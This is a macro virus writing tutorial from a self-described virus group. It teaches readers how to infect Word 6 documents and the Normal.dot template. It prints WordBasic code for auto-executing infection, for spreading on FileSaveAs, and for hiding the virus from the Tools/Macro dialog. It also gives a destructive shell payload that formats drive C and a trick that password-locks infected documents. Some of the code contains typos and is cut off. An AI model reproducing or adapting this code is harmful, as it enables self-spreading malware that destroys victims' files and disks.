<B>INTRODUCTION
-------------

</B>MANY OF YOU MAY BE WONDERING RIGHT NOW WHO THE HELL I AM AND WHO VBB IS.
COME ON LAMERS!  GET ALIVE.  VBB IS ONE OF THE COOLEST VIRUS GROUPS AROUND.
YOU CAN'T TELL ME YOU'VE NEVER HEARD OF US.  WELL, OK I'LL ADMIT IT.  WE'RE
NOT THAT POPULAR YET, BUT THAT'LL COME.  SO FOR NOW HERE'S MY CONTRIBUTION
TO THE GROUP AS THE LEADER.  WELCOME TO THE MACRO VIRUS WRITING TUTORIAL
PART 1!

ENJOY!!


<B>THE TOOLS
----------

</B>FIRST OF ALL YOU'LL NEED MS WORD 6.0 OR UP(DUH), THEN YOU MAY WANT TO GET
VBB'S MACRO DISASSEMBLER BY AURODREPH SO THAT YOU CAN STUDY ENCRYPTED MACROS.
ALSO YOU SHOULD MAKE BACK-UPS OF YOUR NORMAL.DOT TEMPLATE IN YOUR
WINWORD6\TEMPLATE\ DIRECTORY, AS THIS IS THE DOCUMENT COMMONLY INFECTED BY
MACRO VIRII.  SO WHATCH OUT.  ALSO I RECOMMEND TO HAVE AT LEAST A SMALL
KNOWLEDGE OF WORD BASIC, SO THAT YOU KIND A KNOW WHAT'S GOING ON.  WELL,
THAT'S IT.  YOU'VE MADE IT THIS FAR.  IT'S NOW TIME TO GET INTO THE MACRO
VIRUS GENERALS.


<B>THE GENERAL STUFF
-----------------

</B>MOST MACRO VIRII HAVE A PRETTY SET STRUCTURE.  THEY START OF WITH AN
AUTO-EXECUTING MACRO WHICH INFECTS THE NORMAL.DOT(GLOBAL) TEMPLATE.  THEN
THEY HAVE SOME MACROS WHICH WILL INFECT THE FILES ON CERTAIN ACTIONS.  FOR
EXAMPLE FileSaveAs, FileSave, FileOpen, ToolsMacros.  DOCUMENTS ARE INFECTED
THROUGH TRANSFERRING THE MACROS INTO THE DOCUMENT AND HAVING THEM EXECUTE THE
NEXT TIME THE DOCUMENT IS OPENED.  A CODE FOR THE AUTOEXEC ROUTINE WOULD LOOK
SOMETHING LIKE THIS:

'ANYTHING AFTER THE ' ARE MY COMMENTS

Sub MAIN
        On Error Goto Abort
        iMacroCount = CountMacros(0, 0)
        'CHECK TO SEE IF INFECTION EXISTS
        For i = 1 To iMacroCount
                If MacroName$(i, 0, 0) = &quot;PayLoad&quot; Then
                        bInstalled = - 1
                'BY LOOKING FOT THE PAYLOAD MACRO
                End If
                If MacroName$(i, 0, 0) = &quot;FileSaveAs&quot; Then
                        bTooMuchTrouble = - 1
                'BUT IF THE FILESAVEAS MACRO EXISTS THEN INFECTION IS
                'TOO DIFICULT.
                End If
        Next i
        If Not bInstalled And Not bTooMuchTrouble Then
                'add FileSaveAs and copies of   AutoExec and FileSaveAs.
                'Payload has no use except to check for infection.
                'The ,1 encrypts all macros in their destination making
                'them unreadble in Word.
                iWW6IInstance = Val(GetDocumentVar$(&quot;WW6Infector&quot;))
                sMe$ = FileName$()
                Macro$ = sMe$ + &quot;:PayLoad&quot;
                MacroCopy Macro$, &quot;Global:PayLoad&quot;, 1
                Macro$ = sMe$ + &quot;:FileOpen&quot;
                MacroCopy Macro$, &quot;Global:FileOpen&quot;, 1
                Macro$ = sMe$ + &quot;:FileSaveAs&quot;
                MacroCopy Macro$, &quot;Global:FileSaveAs&quot;, 1
                Macro$ = sMe$ + &quot;:AutoExec&quot;
                MacroCopy Macro$, &quot;Global:AutoExec&quot;, 1
                SetProfileString &quot;WW6I&quot;, Str$(iWW6IInstance + 1)
        End If
Abort:
End Sub


<B>THE SaveAs ROUTINE
------------------

</B>THIS IS THE ROUTINE WHICH COPIES THE MACRO VIRUS INTO THE ACTIVE DOCUMENT
WHEN IT IS SAVED USING FILE/SAVE AS.  IT USES MUCH OF THE SAME TECHNIQUES AS
THE AutoExec ROUTINE.  HERE'S WHAT THE CODE SHOULD LOOK LIKE FOR THE SaveAs
ROUTINE:

'YOU CAN ALWAYS USE THE ,1 AGAIN TO ENCRYPT MACROS.

Sub MAIN
Dim dlg As FileSaveAs
GetCurValues dlg
Dialog dlg
If (Dlg.Format = 0) Or (dlg.Format = 1) Then
        MacroCopy &quot;FileSaveAs&quot;, WindowName$() + &quot;:FileSaveAs&quot;
        MacroCopy &quot;FileSave &quot;, WindowName$() + &quot;:FileSave&quot;
        MacroCopy &quot;PayLoad&quot;, WindowName$() + &quot;:PayLoad&quot;
        MacroCopy &quot;FileOpen&quot;, WindowName$() + &quot;:FileOpen&quot;
        Dlg.Format = 1
End If
FileDaveAs dlg
End Sub

SHORT, BUT IT WORKS WELL.  ALL THIS INFO, BELIEVE IT OR NOT, IS ENOUGH
TO MAKE A SMALL AND BASIC MACRO VIRUS.


<B>SPECIAL ROUTINES
----------------

</B>THERE ARE SEVERAL METHODS WHICH CAN BE USED TO HIDE YOUR VIRUS OR MAKE IT
MORE EFFECTIVE.  FOR EXAMPLE, YOU CAN MAKE A MACRO TO HIDE YOUR VIRUS WHEN
SOMEBODY LOOKS IN TOOLS/MACRO.  THE CODE SHOULD LOOK SOMETHING LIKE THIS:

Sub MAIN
        On Error Goto ErrorRoutine

        OldName$ = NomFichier$()

        If macros.bDebug Then
                MsgBox &quot;start ToolsMacro&quot;
                Dim dlg As OutilsMacro
                If macros.bDebug Then MsgBox &quot;1&quot;
                GetCurValues dlg
                If macros.bDebug Then MsgBox &quot;2&quot;
                On Error Goto Skip
                Dialog dlg
                OutilsMacro dlg
Skip:
        On Error Goto ErrorRoutine
        End If

        REM enable automacros
        DisableAutoMacros 0

        macros.SavToGlobal(OldName$)
        macros.objectiv
        Goto Done

ErrorRoutine:
        On Error Goto Done
        If macros.bDebug Then
                MsgBox &quot;error &quot; + Str$(Err) + &quot; occurred&quot;
        End If

Done:
End Sub

ALSO YOU CAN INCLUDE EXERNAL SUBROUTINES.  FOR EXAMPLE, THE NUCLEAR VIRUS
TRIES TO COMPILE AND RUN AN EXTERNAL FILE-INFECTOR VIRUS.  OR SOME MACRO
TROJANS TRY TO FORMAT YOUR HARDDRIVE WHEN YOU OPEN A DOCUMENT.  AN EXAMPLE
SUBROUTINE FOR AN UNCONDITIONAL FORMAT WOULD BE THIS:

        sCmd$ = &quot;echo y|format c: /u&quot;
        Shell Environment$ (&quot;COMSPEC&quot;) + &quot;/c&quot; + sCmd$, 0

ALSO YOU MAY WANT TO PUT A PASSWORD ONTO THE DOCUMENT THAT YOU'VE JUST
INFECTED OR WHEN YOU HAVE EXPERIENCED AN ERROR WHILE INFECTING AND THE
CURRENT SECOND IS 13.  TAKE A LOOK AT THIS EXAMPLE:

Sub MAIN
On Error Goto ByeBye

.
. 'Infection code
.
.
.
\/

ByeBye:
If (second(Now()) = 13) Then
        Dlg.Password = &quot;Dark_Night&quot; 'SETS PASSWORD TO DARK_NIGHT.  YOU CAN
                                    'ALSO SET A RANDOM PASSWORD  CODE SHALL
                                    'PRESENTED IN NEXT INSTALLMENT! :-D

<B>YOUR WORK
---------

</B>I HAVE EXPLAINED THE BASIC KNOWLEDGE YOU NEED TO HAVE TO START
WRITING YOUR MACRO VIRUS.  IF ANYBODY RESPONDS TO THIS TUTORIAL, THEN
I WILL GO INTO MORE DETAILS ABOUT THE DIFFERENT STRUCTURES AND POSSIBILLITIES
OF MACRO VIRII.



<B>INTERESTED?
-----------

</B>I HAVE NO IDEA IF ANYBODY WOULD BE INTERESTED IF I CONTINUE THIS TUTORIAL.
SO TO NOT MAKE MYSELF DO ALL THE WORK FOR NOTHING, I REQUEST THAT YOU PLEASE
DROP ME AN E-MAIL IF YOU WOULD BE INTERESTED IN ANY FURTHER EXPLINATION OF
MACRO VIRII.  I WILL THEN GLADLY CONTINUE THIS TUTORIAL OF MACRO VIRII FOR
YOU.  MY ADDRESS IS:
